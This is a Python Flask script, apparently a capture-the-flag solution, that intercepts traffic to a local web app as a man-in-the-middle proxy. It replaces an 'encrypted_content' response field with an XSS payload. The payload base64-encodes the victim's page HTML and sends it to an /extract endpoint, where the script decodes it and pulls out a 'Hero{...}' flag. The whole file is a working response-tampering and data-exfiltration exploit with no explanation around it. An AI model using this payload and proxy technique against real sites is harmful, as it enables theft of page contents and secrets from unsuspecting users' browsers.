from flask import Flask, request
import requests
import json
import base64
import re

XSS = f"<img src=x onerror=fetch(`/extract?data=${{btoa(document.documentElement.outerHTML)}}`)>"
LET_FLAG_THROUGH = False

app = Flask(__name__)

# Catch all requests
@app.route('/')
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE'])
def proxy(path=None):
    global LET_FLAG_THROUGH
    if path is None:
        path = ''
    url = f"http://127.0.0.1:80/{path}"

    # This is a custom path that is used to get the result of the XSS
    if path == "extract":
        # Get encoded page and replace spaces
        encoded_html = request.args.get('data').strip().replace(' ', '+')
        # Fix padding (js removes trailing = if present)
        missing_padding = len(encoded_html) % 4
        encoded_html_padded = encoded_html + '=' * missing_padding
        # Decode the base64 and get the flag
        html = base64.b64decode(encoded_html_padded).decode()
        flag_content = re.search(r'Hero\{([^}]+)\}', html).group(1)
        print(f'Hero{{{flag_content}}}')
        exit()

    # Extract all information from the initial request
    data = request.get_data()
    headers = {key: value for (key, value) in request.headers if key != 'Host'}

    # Forward request to the real server
    resp = requests.request(
        method=request.method,
        url=url,
        headers=headers,
        data=data,
        cookies=request.cookies,
        allow_redirects=False
    )

    # If it was a request for an encrypted message, update the response to the XSS
    content = resp.content
    if path == "request_encrypted":
        # We let the real flag at least one time through, to make sure it's present in the admin's web page
        if LET_FLAG_THROUGH:
            data = resp.json()
            data["encrypted_content"] = XSS
            content = json.dumps(data).encode('utf-8')
        else:
            LET_FLAG_THROUGH = True
    
    # Update the headers and the content length
    response_headers = [(name, value) if name != 'Content-Length' else (name, str(len(content))) for (name, value) in resp.raw.headers.items()]

    return (content, resp.status_code, response_headers)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1001)
